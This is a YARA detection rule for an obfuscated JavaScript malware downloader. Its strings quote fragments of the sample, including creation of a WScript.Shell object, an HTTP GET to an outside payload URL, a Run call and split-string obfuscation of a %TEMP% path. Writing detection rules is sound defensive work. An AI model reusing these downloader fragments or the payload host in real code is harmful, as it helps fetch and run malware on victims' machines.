rule sig_20160427_956e48ac4d8a0dccb13ba498b0ac1f9b {
  meta:
    description = "datamaliciousorder - file 20160427_956e48ac4d8a0dccb13ba498b0ac1f9b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "99991aa2fb21339523c8576a6297b675e37b1372c43f629383b6b8982389ea4f"

  strings:
    $s1  = "function UrdafZktmr() {return FfsmiYfwza[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"Njx0FVb" ascii
    $s2  = "function UrdafZktmr() {return FfsmiYfwza[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"Njx0FVb" ascii
    $s3  = "var FfsmiYfwza = function FnuqzQwdha() {return LpatkQwpcl[PtlhmTquco](\"WScript\"+\".Shell\");}(), JjavxJeivi = 11;" fullword ascii
    $s4  = "function RktsxKpngj(IybeeNvkmi, EriqwZpdkd){QnfkhEvwkc = QnfkhEvwkc * 1; return IybeeNvkmi - EriqwZpdkd;};" fullword ascii
    $s5  = "GizujNvsin[HakbpNfafj](\"G\" + \"ET\", \"http://adamauto.nl/gdh46ss\", false);" fullword ascii
    $s6  = "var LpatkQwpcl = this[\"WScript\"];" fullword ascii
    $s7  = "function CrsobLunzy(){return ElowqSkmvm + \"\";};" fullword ascii
    $s8  = "if (GizujNvsin[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function XclgfSdlou() {return ((UctexFnuiz == true) && (UctexFnuiz == ZoynuCisxj)) ? 1 : QnfkhEvwkc;};" fullword ascii
    $s10 = "var UctexFnuiz = false;" fullword ascii
    $s11 = "var ZoynuCisxj = false;" fullword ascii
    $s12 = "}while (WhkzrTxphm);" fullword ascii
    $s13 = "function UqkqdPdnud()" fullword ascii
    $s14 = "var GjncpYjpts = false;" fullword ascii
    $s15 = "function ViwcyFjttq(GfpgjDxjiz){FfsmiYfwza[\"R\"+\"un\"](GfpgjDxjiz, QnfkhEvwkc, QnfkhEvwkc);};" fullword ascii
    $s16 = "var MshnqMcbrd = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "function OhbczXubjl(MielcJtnmc) {var JgfbvShqio = (1, 2, 3, 4, 5, MielcJtnmc); return JgfbvShqio;};" fullword ascii
    $s18 = "function XtuznDlvqb(){return 23;};" fullword ascii
    $s19 = "return RktsxKpngj(AizybEkrsz, JdkpvRatmr);" fullword ascii
    $s20 = "UctexFnuiz = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}